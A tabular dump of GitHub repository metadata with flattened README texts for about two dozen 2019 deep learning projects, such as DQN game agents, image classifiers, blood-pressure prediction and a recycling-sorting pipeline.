GuoshenLi,Deep-Reinforcement-Learning-for-the-Fighter-Theater,n/a,Deep Reinforcement Learning for the Fighter Theater Overviews Inspired by intelligent gaming I focus on how to use Deep Reinforcement Learning algorithm to play the Fighter Teather in which heroes of both sides can fight against those in the opposite and seek energy stones The whole project contains 2 parts Using python to build a game and training the game with Deep Reinforcement Learning Installation Dependencies pytmx 3 21 5 pygame 1 9 3 psutil 5 4 3 Python 2 7 OpenCV Python TensorFlow 1 10 1 make sure to install TensorFlow that corresponds to Python 2 7 Some Suggestions about the Installation Dependencies Important Since the game code is written in Python 2 7 make sure that you use Python 2 instead Python 3 to run For Windows users I have already read some files that mention Tensorflow does not have the corresponding version to Python 2 7 under Windows system So I recommend you use Mac or Linux to run the code I run my code on Mac so if you have any problem in doing so feel free to contact me How to train the network Unzip the zip file FighterDQN2015Nature zip or FighterDoubleDQN first Train the network with the following parameters and Do not import any saved networks OBSERVE 100000 timesteps to observe before training EXPLORE 1000000 frames over which to anneal epsilon FINALEPSILON 0 0001 final value of epsilon which is 0 0001 INITIALEPSILON 1 starting value of epsilon which is 1 Use the following command cd Fighter python game After 2000000 iterations it will automatically show two diagrams of the Average Reward and the Max Qvalue history and it will also store the relative data of the two diagrams into mat file to reuse it later The Average Reward of one game epoch equals to total reward of the game epoch divided by total time step of that epoch Future Work I will update some details about the code and make some adjustments to optimize it if I have time I have already uploaded the 2015 Nature DQN and Double DQN for training the 2013 NIPS DQN will be uploaded later Ideas2 Utilizing Duelling DQN or prioritized experience replay to see how it can improve the performance of DQNs But it all depends on time Update Logs 2019 9 20 China Warnings I am GuoshenLi and I hope you can respect my hard work during the entire summer vacation Any plagiarism is not allowed But I am looking forward to cooperating with someone who is also interested in reinforcement learning Acknowledgement Special thanks to Dr Zhang who gave me inspiration of the project Reference Disclaimer The game code is inspired by https github com lfkdsk FighterTheater and I made some changes of the game to make it less chaotic The DQN code is based on https github com yenchenlin DeepLearningFlappyBird,2019-09-20T08:37:16Z,2019-09-20T08:56:24Z,n/a,GuoshenLi,User,1,1,0,6,master,GuoshenLi,1,0,0,0,0,0,0
oorqueda,sjsu-IntroductionToDeepLearningFrameworks,n/a,Introduction to Deep Learning Frameworks Presentation and Jupyter notebooks for lecture at SJSU Introduction to Deep Learning Frameworks October 2nd 2019,2019-10-03T05:13:44Z,2019-10-06T22:49:05Z,Jupyter Notebook,oorqueda,User,1,1,0,3,master,oorqueda,1,0,0,0,0,0,0
Chandan-IITI,Deep-Kernel-Learning-for-One-class-Classification,n/a,Minimum Variance Embedded Deep Kernel Learning for One class Classification DKRLVOC Paper Minimum Variance Embedded Deep Kernel Regularized Least Square Method for One class Classification and Its Applications to Biomedical Data Submitted Authors Chandan Gautam Pratik K Mishra Aruna Tiwari Bharat Richhariya Hari Mohan Pandey Shuihua Wang M Tanveer For execution simply go to the one of the demo folders DemoAlzheimer DemomediumDatasets or DemosmallDatasets and open m file in MATLAB and execute that All source codes and datases are available in src folder This repository also contains implementation of the following papers for comparison 1 OCKELM Leng Q Qi H Miao J Zhu W Su G 2015 One class classification with extreme learning machine Mathematical problems in engineering 2015 2 VOCKELM Mygdalis V Iosifidis A Tefas A Pitas I 2016 September One class classification applied in facial image analysis In 2016 IEEE International Conference on Image Processing ICIP pp 1644 1648 IEEE 3 ML OCKELM Dai H Cao J Wang T Deng M Yang Z 2019 Multilayer one class extreme learning machine Neural Networks 115 11 22 For any query related to the above code you can reach me at chandangautam31 gmail com,2019-09-25T06:56:16Z,2019-10-23T03:21:09Z,MATLAB,Chandan-IITI,User,2,1,1,31,master,Chandan-IITI#PratikMishra,2,0,0,0,0,0,0
namas191297,waste_classifier,n/a,Waste Classification With the current world environment scenario in mind I always wanted to use the existing technology to make a difference in how we perceive and classify the waste garbage that we dispose in our daily lives We know that a lot of things that are non biodegradable are disposed carelessly which have severe repercussions on our environment The idea was to come up with a Waste Classifier that allows us to correctly identify the type of waste ie Whether it is recyclable or organic based on which it can be disposed properly Although it might not be of great significance it was fascinating to come up with an innovative idea that can be expanded and implemented in various places Moreover I added a text to speech feature that allows people who are visually impaired to use it without any problems Implementation Click on the image below to play the video Video https imgur com fA1jaQK png https www youtube com watch v rBeKie2hZPs Model and Data Samples Samples images images png Learning Rate Samples images learningrate png Metrics Metrics images accuracy png Losses Losses images losses png Results Samples images results png License GNU AGPL v3 0 https choosealicense com licenses agpl 3 0,2019-09-28T18:37:54Z,2019-09-29T10:10:52Z,n/a,namas191297,User,1,1,0,1,master,namas191297,1,0,0,0,0,0,0
sonisvm,dl-on-the-edge,n/a,About This application runs the object detection algorithm YOLO on Intel Neural Compute Sticks and uses a browser based UI to display the predictions The architecture of the system is as below Architecture Diagram Architecturediagram png Client The client is a React app The UI allows three types of inputs image video and webcam stream If the input is an image it is converted to a base64 encoded string and sent to server The server decodes the image and runs the detection algorithm on it Server then sends back the prediction results class score and bounding box locations which are then displayed on the UI For video or video stream captured through UI the workflow is same except that in this case each frame of the video is encoded as base64 string and sent to server To run the client follow the below steps cd app npm install npm start The client runs on port 3000 Server The server is a simple Flask server To run the server 1 pip install Flask prefered in virtualenv https flask palletsprojects com en 1 1 x installation 2 setup OpenVINO env as instructed by Intel 3 run python3 serverparalel py 4 plugin the device when you see the instruction one by one The server supports two APIs 1 POST detectobjects This API is used to send the image data to the server URL http device ip 5000 detectobjects request body json image Base 64 encoded image as a string mode parallel or ensemble models one or more model names as an array The server accepts the request data and immediately responds with 200 response code The data is processed asynchronously and the prediction results are stored in the server until requested by the client 2 GET detectobjectsresponse This API is used to retrieve the prediction results from the server The client repeatedly polls the server with this API until a response is given URL http device ip 5000 detectobjectsresponse models Response with mode parallel Json model1 bbox 1 0 200 200 class person score 0 838 model2 bbox 1 0 200 200 class person score 0 838 model3 bbox 1 0 200 200 class person score 0 838 with mode ensemble Json all bbox 1 0 200 200 class person score 0 838 Demo http img youtube com vi qs5oX4c qU 0 jpg http www youtube com watch v qs5oX4c qU Demo,2019-10-05T18:49:04Z,2019-12-03T14:43:26Z,Python,sonisvm,User,4,1,0,22,master,vqng#sonisvm#LukasMarx#thatcharles,4,0,0,0,0,0,0
hank08tw,Deep-Q-learning-and-Alzheimer-s-disease,n/a,Deep Q learning and Alzheimer s disease In this project we create a deep Q learning model to imitate and compare the path walked by Alzheimer s patient and the path generated by model If you want to train and run the model first create a python virtual environment then activate it then install tensorflow and kera Then revise the parameters in qmazegeneral py and run python3 qmazegeneral py to train the model and show the path walked by model If you want to walk the maze in virtual reality make sure to prepare VR helmet and two hand controllers use unity to open testmaze directory and run,2019-10-04T08:10:01Z,2019-10-04T15:56:39Z,C#,hank08tw,User,1,1,1,4,master,hank08tw,1,0,0,0,0,0,0
shankarjadhav232,Leaf-Diseases-Classification-Using-Deep-Learning,n/a,Leaf Diseases Classification Using Deep Learning,2019-10-17T16:37:57Z,2019-11-20T05:13:10Z,Jupyter Notebook,shankarjadhav232,User,1,1,0,2,master,shankarjadhav232,1,0,0,0,0,0,0
dsinghnegi,DQN-keras,n/a,DQN keras Deep Q Learning agent using Keras for CartPole simulation using GYM GitHub Logo images demo gif Quickstart pip3 install r requirements txt python3 main py Libraries used OpenAI gym numpy Keras License The Apache 2 0 License Please see the license file LICENSE for more information References https github com keon deep q learning,2019-10-25T16:41:47Z,2019-10-29T11:50:51Z,Python,dsinghnegi,User,1,1,0,4,master,dsinghnegi,1,0,0,0,0,0,0
eitrheim,MiniPacmanDQN,n/a,MiniPacmanDQN Deep Reinforcement Learning with Pacman Demo Demo pacman gif Requirements python 3 5 1 tensorflow 2 0 0 Keras 2 3 0 numpy 1 17 2 Related work Stanford s Multi Agent Pac Man https stanford edu cpiech cs221 homework prog pacman pacman html UC Berkeley CS188 Intro to AI Pac Man Projects http ai berkeley edu projectoverview html tychovdo s github https github com tychovdo PacmanDQN,2019-10-30T05:58:16Z,2019-11-05T08:14:10Z,Python,eitrheim,User,1,1,0,13,master,eitrheim,1,0,0,0,0,0,0
minoring,models,n/a,TensorFlow Models This repository contains a number of different models implemented in TensorFlow https www tensorflow org The official models official are a collection of example models that use TensorFlow s high level APIs They are intended to be well maintained tested and kept up to date with the latest stable TensorFlow API They should also be reasonably optimized for fast performance while still being easy to read We especially recommend newer TensorFlow users to start here The research models https github com tensorflow models tree master research are a large collection of models implemented in TensorFlow by researchers They are not officially supported or available in release branches it is up to the individual researchers to maintain the models and or provide support on issues and pull requests The samples folder samples contains code snippets and smaller models that demonstrate features of TensorFlow including code presented in various blog posts The tutorials folder tutorials is a collection of models described in the TensorFlow tutorials https www tensorflow org tutorials Contribution guidelines If you want to contribute to models be sure to review the contribution guidelines CONTRIBUTING md License Apache License 2 0 LICENSE,2019-10-16T21:49:34Z,2019-11-25T11:42:01Z,Python,minoring,User,0,1,0,3482,master,nealwu#MarkDaoust#tfboyd#pkulzc#cshallue#saberkun#robieta#derekjchow#lukaszkaiser#guptapriya#lamberta#haoyuz#reedwm#tombstone#asimshankar#seemuch#martinwicke#tensorflower-gardener#qlzh727#jch1#karmel#bousmalis#joel-shor#a-dai#YknZhu#panyx0718#sguada#shlens#raymond-yuan#itsmeolivia#alexgorban#yhliang2018#dubey#korrawat#nnigania#k-w-w#vinhngx#dreamdragon#aquariusjay#isaprykin#elibixby#nmjohn#davidmochen#ilyamironov#waterson#aselle#plakal#shizhiw#andrefaraujo#alanyee#sussillo#yuefengz#rxsang#av8ramit#calberti#npapernot#djoshea#hongjunChoi#josh11b#rachellj218#vincentvanhoucke#ofirnachum#hjp709394#gunan#vmarkovtsev#alextamkin#jart#suharshs#yongzhe2160#hsm207#AlexeyKurakin#BarretZoph#huihui-personal#allenlavoie#lindong28#vladmos#drpngx#aman2930#tae-jun#DecentGradient#rsepassi#akshayka#jmchen-g#mrphoenix13#mees#zongweiz#bfontain#mrry#frankchn#protoget#jimmyyentran#markomernick#petewarden#akuegel#alexlee-gk#arinto#dpwe#dave-andersen#dheera#justanhduc#goldiegadde#houtoms#rezama#s-gupta#tayo#lintian06#Vyas9296#yeqingli#swlsw#zanarmstrong#r2d4#gjtucker#yashk2810#alextp#ahundt#arkanath#arvind2505#bmabey#snnn#damienv-gh#danabo#mdanatg#haozha111#buckman-google#jazcollins#jlim262#joshthoward#knathanieltucker#clarkkev#MTDzi#marksandler2#MarvinTeichmann#orionr#rzumer#samikama#stsievert#sbrodehl#staff0rd#vrv#xcyan#yaroslavvb#walkerlala#achowdhery#anj-s#bananabowl#mhyttsten#mloenow#sauercrowd#adrianboguszewski#aaroey#iganichev#XinyueZ#daviddao#rrtaylor#VastoLorde95#algal#DrewNF#aysark#charlesreid1#chan1#chrismattmann#ctessum#crizCraig#dakshvar22#dandouthit#warmspringwinds#dweekly#dieterichlawson#edouardfouche#ema987#cheshire#gogasca#Henry-E#sculd#shamoya#moonboots#hellojas#yjmade#jadekler#jlewi#snurkabill#jonsafari#JonathanJuhl#kemaswill#LiberiFatali#lucky096#lababidi#mari-linhares#MatthiasWinkelmann#mfigurnov#norouzi#naurril#nirum#pranay360#rachellim#theraysmith#rohan100jain#SNeugber#grwlf#slavpetrov#sshrdp#StevenHickson#swaroopgj#terryykoo#tmattio#WillAyd#wolffg#ywryoo#yk5#ppwwyyxx#yuyuz#amirbar#cclauss#chsin#jzhugithub#kaiix#liangxiao05#talkdirty#tf-models-copybara-bot#thess24#xiangjinwu#matiji66#gatoatigrado#callofdutyops#saeta#dmrd#dthkao#dmansfield#jaingaurav#lukelafountaine#ispirmustafa#yesmung#leonardgithub#inflation#ajschumacher#TwistedHardware#abhinavsagar#angryadam#atsheehan#udnaan#iakashpaul#apbusia#aarorasimbulus#mackeya-google#alexalemi#AsterAI#AndreiCostinescu#andrewgilbert12#aneliaangelova#angusmcleod#Aniruddha-Tapas#Anthony-Tatowicz#alasin#playadust#arokem#arne-cl#arsalan-mousavian#arvind385801#awilliamson#augustjanse#BMDan#BoyuanJiang#bapfeld#brettkoonce#brilee#Buzzology#ByeongjooAhn#ConceitedCode#SA-Framework#cbfinn#chenxi116#cpandar#czhang96#23pointsNorth#danieljl#danieldk#davidbrai#Hanqing-Sun#devanshdalal#Devansh-S#yutkin#domschl#donkirkby#dougalsutherland#dwightjl#e7dud7e#Egor-Krivov#elielhojman#emsansone#EmilStenstrom#strubell#erssebaggala#Ersho#EvanKepner#ewanlee#fmannan#fangweili#feynmanliang#filipefilardi#franckverrot#GBLin5566#georgw777#NescobarAlopLop#gwulfs#gideaoabreu#graphaelli#iepathos#gnprice#gyang274#wileeam#guoyejun#haichaoyu#Kongsea#zsdonghao#harshul1610#HelgeS#chantera#parkjaeman#j-min#jaewoosong#darthdeus#jameshwang#jubjamie#j143#credentiality#jeuvilla#jnieuviarts#theJiangYu#jzhoulon#jalateras#JimHeo#jsimsa#johnarevalo#jonasrauber#JonathanCMitchell#williford#wookayin#random-forests#JulesGM#karanchahal#n-kats#kazunori279#kenkawakenkenke#kcsodetz#kepingwang#krishpop#rockokw#legel#laurent-dinh#lilao#Liampronan#lilipads#ffmpbgrnn#liviosoares#MalcolmSlaney#keveman#marcbelmont#martinkersner#nightscape#MaxGhenis#MehdiShz#mgruben#kopankom#MikalaiDrabovich#marpaia#case540#merofeev#mindos#mbz#NatLee#Lambert-Shirzad#neilhong#nkconnor#NilsLattek#nhasabni#npanpaliya#niyazpk#toxic-0518#olganw#unratito#dynamicwebpaige#shahparth123#flipace#plediii#pgericson,385,0,10,0,0,0,0
krishnonwork,mathematical-methods-in-deep-learning-ipython,n/a,Mathematical Methods in Deep Learning Python code in the form of Jupyter ipython notebooks to support the book Mathematical Methods in Deep Learning Krishnendu Chaudhury Ananya Ashok Honnedevasthana Sujay Narumanchi Devashish Shankar This repository contains the example code mostly in Numpy and PyTorch corresponding to the theoretical topics introduced in the book The code listings are organized in chapters that correspond to the main book Installation 1 Clone the repository git clone https github com krishnonwork mathematical methods in deep learning ipython git 2 Create virtual environment virtualenv venv 3 Activate virtual environment source venv bin activate 4 Install dependencies pip install r requirements txt 5 Navigate to the python directory cd python 6 Start jupyter jupyter notebook This will redirect you to a browser window with the ipython notebooks Note Setup works with both python2 and python3 Table of Contents Chapter 2 2 2 Intro to Vectors https nbviewer jupyter org github krishnonwork mathematical methods in deep learning ipython blob master python ch2 2 2 vector numpy pytorch intro ipynb 2 4 Intro to Matrices Tensors and Images https nbviewer jupyter org github krishnonwork mathematical methods in deep learning ipython blob master python ch2 2 4 matrix numpy pytorch intro ipynb 2 7 Basic Vector and Matrix operations https nbviewer jupyter org github krishnonwork mathematical methods in deep learning ipython blob master python ch2 2 7 transpose dot matmul numpy pytorch ipynb 2 12 5 Solving an overdetermined system using pseudo inverse https nbviewer jupyter org github krishnonwork mathematical methods in deep learning ipython blob master python ch2 2 12 5 overdet numpy ipynb 2 13 Eigenvalues and Eigenvectors https nbviewer jupyter org github krishnonwork mathematical methods in deep learning ipython blob master python ch2 2 13 eig numpy ipynb 2 14 Rotation Matrices https nbviewer jupyter org github krishnonwork mathematical methods in deep learning ipython blob master python ch2 2 14 rotation numpy ipynb 2 15 Matrix Diagonalization https nbviewer jupyter org github krishnonwork mathematical methods in deep learning ipython blob master python ch2 2 15 mat diagonalization numpy ipynb 2 16 Spectral Decomposition of a Symmetric Matrix https nbviewer jupyter org github krishnonwork mathematical methods in deep learning ipython blob master python ch2 2 16 spectral decomp numpy ipynb 2 17 Finding the axes of a hyper ellipse https nbviewer jupyter org github krishnonwork mathematical methods in deep learning ipython blob master python ch2 2 17 hyper ellipse numpy ipynb Chapter 3 3 4 Common code for chapter 3 https nbviewer jupyter org github krishnonwork mathematical methods in deep learning ipython blob master python ch3 3 4 common ipynb 3 4 1 Gradient Descent https nbviewer jupyter org github krishnonwork mathematical methods in deep learning ipython blob master python ch3 3 4 1 gradients numpy pytorch ipynb 3 4 2 Non linear Models https nbviewer jupyter org github krishnonwork mathematical methods in deep learning ipython blob master python ch3 3 4 2 gradients nonlinear numpy pytorch ipynb 3 4 3 A Linear Model for the cat brain https nbviewer jupyter org github krishnonwork mathematical methods in deep learning ipython blob master python ch3 3 4 3 gradients catbrain numpy pytorch ipynb Chapter 4 4 3 2 Common code for chapter 4 https nbviewer jupyter org github krishnonwork mathematical methods in deep learning ipython blob master python ch4 4 3 2 common ipynb 4 3 2 PCA on synthetic correlated data https nbviewer jupyter org github krishnonwork mathematical methods in deep learning ipython blob master python ch4 4 3 2 pca numpy ipynb 4 3 2 PCA on synthetic uncorrelated data https nbviewer jupyter org github krishnonwork mathematical methods in deep learning ipython blob master python ch4 4 3 2 pca uncorrelated numpy ipynb 4 3 3 PCA on synthetic correlated non linear data https nbviewer jupyter org github krishnonwork mathematical methods in deep learning ipython blob master python ch4 4 3 3 pca nonlinear numpy ipynb 4 4 4 Linear system solving via SVD https nbviewer jupyter org github krishnonwork mathematical methods in deep learning ipython blob master python ch4 4 4 4 svd linear system numpy ipynb 4 4 5 PCA computation via SVD https nbviewer jupyter org github krishnonwork mathematical methods in deep learning ipython blob master python ch4 4 4 5 svd pca numpy ipynb 4 5 3 LSA SVD on a 500 3 dataset https nbviewer jupyter org github krishnonwork mathematical methods in deep learning ipython blob master python ch4 4 5 3 svd lsa numpy ipynb,2019-10-13T08:09:21Z,2019-12-01T08:52:41Z,Jupyter Notebook,krishnonwork,User,3,1,0,8,master,sujaynarumanchi#krishnonwork#ananya-h-a,3,0,0,0,0,0,6
anandnitt,Cuff-less-BP-using-Deep-Learning,n/a,Cuff less Blood Pressure Prediction This repository hosts the code for Prediction of Blood Pressure from ECG and PPG signals using two methods 1 Feature Extraction and Regression using Machine Learning Methods 2 Deep learning based regression Getting Started Clone this repo bash git clone https github com jeya maria jose CufflessBPPrediction cd CufflessBPPrediction Dataset Dataset Link https archive ics uci edu ml machine learning databases 00340 This database consist of a cell array of matrices each cell is one record part In each matrix each row corresponds to one signal channel 1 PPG signal FS 125Hz photoplethysmograph from fingertip 2 ABP signal FS 125Hz invasive arterial blood pressure mmHg 3 ECG signal FS 125Hz electrocardiogram from channel II Feature Extraction and Machine Learning based method Prerequisites MATLAB Python 3 Scikit learn Feature Extraction The features taken are explained here sevenfeatures m Code to extract the features WN PIR PTT HR IH IL Meu ppgfeatures m Code to extract the PPG features PTTfinal m Code to extract the PTT The extracted features are saved in a CSV file from MATLAB Machine Learning models bash cd modelsML python rf py Using the DL Code Prerequisites Linux Python 3 Pytorch Training bash cd modelsDL cnnlstmconcat python cnnmultitask py Testing bash cd modelsDL cnnlstmconcat python cnntest py Disclaimer The code is not completely clean as the data directories are initialized manually Please make sure the directories are changed according to the remote server where the code is run Results Coming Soon,2019-10-02T11:16:33Z,2019-10-02T11:45:17Z,Python,anandnitt,User,1,1,0,15,master,anandnitt,1,0,0,0,0,0,0
hemanthsaimanne,classification_of_flowers_deep_learning_model,n/a,classificationofflowersdeeplearningmodel,2019-09-25T13:39:50Z,2019-09-28T10:38:17Z,Jupyter Notebook,hemanthsaimanne,User,1,1,0,2,master,hemanthsaimanne,1,0,0,0,0,0,0
tarasivashchuk,deep-topts,convolutional-neural-networks#deep-learning#deep-neural-networks#deeplearning#feedforward-neural-network#neural-network#neural-networks#numpy#recurrent-neural-networks,deep topts Collection of experiments and personal studies in deep learning There are currently three packages that are included within the src directory each with a unique foundational idea behind them Work on this is done when I have some spare time or have an idea I want to experiment with and test so updates aren t regular but if I decide to stop development I will make sure to update this README Usage Permission If you use code from the opt experimental package then it d be awesome if you shoot me an email to let me know about it as I would love to hearand give me credit I won t sue you or anything if you don t though just relying on people hopefully being supportive and honest Contact Details Feel free to contact me at taras tarasivashchuk com mailto taras tarasivashchuk com for anything related to this repository or software engineering in general and I ll respond unless it s just spam hate mail or anything completely unrelated Prerequisites Python 3 7 Pytorch was installed for this version of Python and even though I haven t tested it any 3 5 version should work fine Numpy 1 16 5 Pytorch 1 3 0 Only needed for the opt experimental package List of Project Packages 1 opt experimental This package is where I experiment with implementing various ideas I have about neural networks and any supporting algorithms or structures This can include everything from unique architectures to optimization functions 2 opt nn Deep learning library built from the ground up without any deep learning libraries or frameworks Numpy is used to handle optimized matrix and tensor operations 3 opt utils Utility modules for dataset related functionality data cleaning and other things along those lines Currently only has code for generating dummy datasets for testing purposes Copyright copy 2019 Taras Ivashchuk,2019-09-24T17:23:54Z,2019-11-03T14:07:50Z,Python,tarasivashchuk,User,1,1,0,14,master,tarasivashchuk,1,0,0,0,0,0,0
Cocogeek,Algorithmic-Machine-Learning,n/a,Algorithmic Machine Learning These notebooks were carried out as part of my first year of master at Eurecom during the AML class These projects were realised in team with yasserben link of his github here https github com yasserben The notebooks are organised as follows Study of the data Preprocessing of the data Modelling and parameter optimization Application on test data The first lab is a large scale recommender system using ALS algorithm The second notebook is taken from a Kaggle challenge and aims at predicting house prices using the ElasticNet Lasso and Ridge algorithms The third work deals with classification of plankton images using a Convolutionnal Neural Network Finally the last one is about anomaly detection using LogisticRegression Random Forest and Scalable Baysien Rule Lists,2019-10-18T11:25:24Z,2019-10-21T09:29:55Z,Jupyter Notebook,Cocogeek,User,1,1,0,15,master,Cocogeek,1,0,0,0,0,0,0
Abhishekbhagwat,face_identity_DL_opencv,n/a,Face Recognition System using OpenCV and Deep Learning This is an implementation of Face recognition and identification to implement an attendance system using a live video feed Setup 1 Install and activate a virtualenv pip install virtualenv python3 m virtualenv env source env bin activate 2 Install Requirements pip3 install r requirements txt 3 Generate Training Data OPTIONAL The training data is the pictures of all the people whom you want to recognize This script uses your webcam to capture 50 images continuously and store it in the trainimg folder python3 generatedata py 3 Preprocess data The training data is now preprocessed with the faces being cropped and the faces are labelled here python3 datapreprocess py 4 Model Training The model is trained to extract the features from the face by using Haar Cascaders and the classes are labelled here classifier py contains the model which we are currently using I currently use Linear SVM to predict the probability of a particular class python3 trainmodel py 5 Identify Face This is the last part where we try to identify a particular face by drawing a bounding box around it The class with the highest probability for the image is shown as the label of the image The current confidence threshhold is 70 but this can be changed according to the preference of the user If the confidence is less than 70 then the face is not identified python3 indentifyfacevideo py Credits 1 FaceNet A Unified Embedding for Face Recognition and Clustering David Sandberg Repo https github com davidsandberg facenet 2 A Discriminative Feature Learning Approach for Deep Face Recognition 3 Deep Face Recognition,2019-10-03T05:22:55Z,2019-10-26T18:00:57Z,Python,Abhishekbhagwat,User,1,1,2,8,master,dexleow96#Abhishekbhagwat,2,0,0,0,0,1,2
carlo98,airsim-drone-landing-DL-and-RL,airsim#deep-learning#deep-reinforcement-learning#drone-landing#multirotor,airsim drone landing DL and RL Airsim multirotor landing in two phases using deep reinforcement learning and deep learning droneRLlandingVerticalLidar py is based on the RL code found here https adventuresinmachinelearning com reinforcement learning tensorflow droneNNlanding py complete landing using deep learning trained models can be found in models If you want to train you can find two notebooks one for horizontal and one for vertical for the horizontal phase you ll need to take images and split them in five different folder up down left right trigger for the vertical phase you can find a method that takes data and saves it as csv file in droneNNlandingVertical py Airsim repo https github com microsoft AirSim,2019-09-23T14:04:25Z,2019-11-07T09:52:01Z,Jupyter Notebook,carlo98,User,1,1,0,8,master,carlo98,1,0,0,0,0,0,0
bguan2020,deep_chem_kaggle,n/a,kaggleproject deep chem python libs to train df on machine learning algs data from kaggle,2019-10-04T05:18:26Z,2019-12-12T15:43:08Z,Python,bguan2020,User,1,1,1,10,master,bguan2020,1,0,0,0,0,0,0
cleuton,deeplearning_spark_systemml,n/a,deeplearningsparksystemml A Deep Learning job running on Spark with SystemML,2019-09-26T10:02:35Z,2019-11-06T21:17:53Z,n/a,cleuton,User,1,1,0,1,master,cleuton,1,0,0,0,0,0,0
scliu476,QL-Exercise-01-TensorFlow-Implementation,n/a,,2019-09-22T18:31:40Z,2019-09-22T18:33:23Z,Jupyter Notebook,scliu476,User,1,1,0,1,master,scliu476,1,0,0,0,0,0,0
nikhilt1998,Moody-A-mood-indicator,deep-learning#flask#machine-learning#project#text-processing,Moody A mood indicator A machine learning and deep learning based flask app,2019-10-15T18:28:49Z,2019-11-17T06:41:57Z,Python,nikhilt1998,User,1,1,0,3,master,nikhilt1998,1,0,0,0,0,1,0
KAttila98,DL-NHF,n/a,DL NHF Deep Learning Homework GAN s n Roses 2nd Milestone The notebook note2img contains the python code which generated the image outputs from midi files The notebook MusicGenerator presents a training executed on a DCGAN The results of the training generated images can be found in the output directory The music h5 file contains the weights of the trained model In the data directory there are the raw midi files In images there are the images with dimension 88x200 which were generated from midi files The images for the second type of encoding mentioned in the documentation can be found at https bmeedu my sharepoint com f g personal attilakadaredubmehu EuD56pClinlIgbZOGPqS fUBzHP7GMEZNdVkmFlJ5LOPTg e UT9JLl,2019-10-14T19:29:41Z,2019-12-13T23:27:04Z,Jupyter Notebook,KAttila98,User,1,1,0,30,master,KAttila98#lantgabor#zaturalma2,3,0,0,0,0,0,0
BrianOfrim,recyclops,n/a,Recyclops An end to end application for classifying recycling using tensorflow 2 A critical part of the recycling process is sorting recyclable items into the correct categories Incorrectly sorted or contaminated items cause huge losses to the productivity of recycling processing facitities and huge losses in the amount of recyclable items that are actually recycled See https fivethirtyeight com features the era of easy recycling may be coming to an end This project aims to aid in the classification of recyclable items There are 4 main parts to this image classification workflow data gathering data cleaning neural network model training and model deployment The programs are intentionally fairly agnostic to the categories so that the same methodologies and workflow can be applied to other image classification applications Gather GatherScreenShot https raw githubusercontent com BrianOfrim recyclops master doc assets gatherSample480 jpg The program gather gather py will overlay the categories for image classification on the live camera image stream Enter the key for one of the category options to classify the current live stream image and have it sent to s3 storage Clean CleanScreenShot https raw githubusercontent com BrianOfrim recyclops master doc assets cleanSample480 jpg The accuracy of the image classification model is dependent upon the accuracy of the training data so before using the gathered data for training we need to verify the accuracy of the images To do this we will use clean clean py The image category options will be overlaid on the image along with the category it was assigned at the gathering stage Press the corresponding character key to classify the image Press s to skip the current image press w to return to a previous image Note that going to the previous image with w will remove the clean category given to the current image and it must be re classified when the image is returned to Images to be cleaned are downloaded from s3 After cleaning the list of verified items is uploaded to s3 and any incorrectly classified items from the gathering stage are uploaded to the correct s3 location Train Setup To obtain the classified images that will be used for training the train setup py program will be used This downloads the most recent version of the verification list from s3 for each category and ensures that all verified images are downloaded prior to training The train setup py will also download the newest trained model that was uploaded to s3 by a previous run of the train train py program which will be described later Hyperparameter Search In order to increase validation and test accuracy we must find the optimal hyperparameters for training the model Hyperparameter serach is done with the train hParamSearch py program We will do a grid search of hyperparameters for this project meaning that we will train the model with every combination of hyperparameters and compare the final validation accuracy for each set of hyperparameters For this project the hyperparameters that we are primarly interested in are Training Batch Size e g 4 8 16 32 Dropout Rate e g 0 0 0 1 0 2 0 3 0 4 0 5 Optimizer e g adam RMSprop Base Learning Rate e g 0 0001 0 00001 Fine Tuning e g True False For this application a good set of hyper parameters were determined to be Batch size 4 Dropout 0 25 Optimizer RMSprop Learning rate 0 00001 With the number of epochs set to 35 For each run i e set of hyperparameters we will log the training statistics training accuracy loss validation accuracy loss We will then use tensorboard https www tensorflow org tensorboard to view the logged data and determine which set of hyperparameters are best suited for our application For the base model we will use MobileNetV2 pretrained on imagenet We will exclude the top layer of the network and add our own global pooling and classification layers on top We will take advantage of the pretrained network s feature extraction vector layer by freezing the headless base model We will then train the layers we added in order to classify images into our categories When the hyperparameter Fine Tuning is True we will reduce the learning rate by 10x unfreeze part of the initial pretrained network and perform fine tuning training on the unfrozen portion of the network in addition to the added layers Training Once we have found the most optimal hyperparameters from our grid search we will use train train py to train save and upload the model that we will deploy We will input the hyperparameters we wish to use to train the model via command line flag arguments We can also customize the training run with other command line flag arguments such as the number of epochs validation split etc To see the full list of arguments use python3 train py help The help flag can be given to any of the scripts in this repo to get a list of all command line flag options Once the training script is completed the trained model will be zipped and uploaded to s3 for us to download and deploy as part of the deployment stage The train train py can also take advantage of GPU acceleration to increase the speed of training Running train train py on an AWS p3 2xlarge EC2 instance has NVIDIA Tesla V100 GPU with the GPU enabled version of tensorflow 2 https www tensorflow org install gpu it was observed that the training speedup was around 6x for batch size 32 when compared to CPU based training on a workstation computer The GPU speedup relative to CPU increases as batch size increases as there will be less frequent CPU to GPU memory transfer When training is complete the saved model folder will be zipped and sent to s3 As mentioned earlier the saved model can be obtained on any computer with access to the recyclops s3 bucket using the train setup py program Similar to train hParamSearch py the training accuracy loss and validation accuracy loss will be logged in a format that makes it viewable with tensorboard Deploy DeployScreenShot https raw githubusercontent com BrianOfrim recyclops master doc assets deploySample480 jpg The deploy classifier py script can be run once the latest trained model has been obtained with train setup py This program will classify items into different categories There are command line options for this program that can be observed with python classifier py help,2019-10-21T03:05:12Z,2019-12-12T18:42:39Z,Python,BrianOfrim,User,1,1,0,109,master,BrianOfrim,1,0,0,0,0,0,0
hopexn,DRL_Impl,n/a,DRLImpl Some implementations of deep reinforcement learning algorithms,2019-10-01T09:30:55Z,2019-12-12T15:22:50Z,Python,hopexn,User,1,1,0,14,master,hopexn,1,0,0,0,0,0,0
sgaseretto,lightdlf,n/a,THIS FILE WAS AUTOGENERATED DO NOT EDIT file to edit notebooks index ipynb command to build the docs after a change nbdevbuilddocs LightDLF Implementacion de un framework de deep learning para entender como funcionan Para ms detalles ver la documentacion https sgaseretto github io lightdlf Instalacin pip install lightdlf Requerimientos numpy scikit learn pandas phe,2019-09-26T21:00:49Z,2019-12-13T15:54:46Z,Jupyter Notebook,sgaseretto,User,1,1,0,69,master,sgaseretto,1,0,0,0,0,0,0
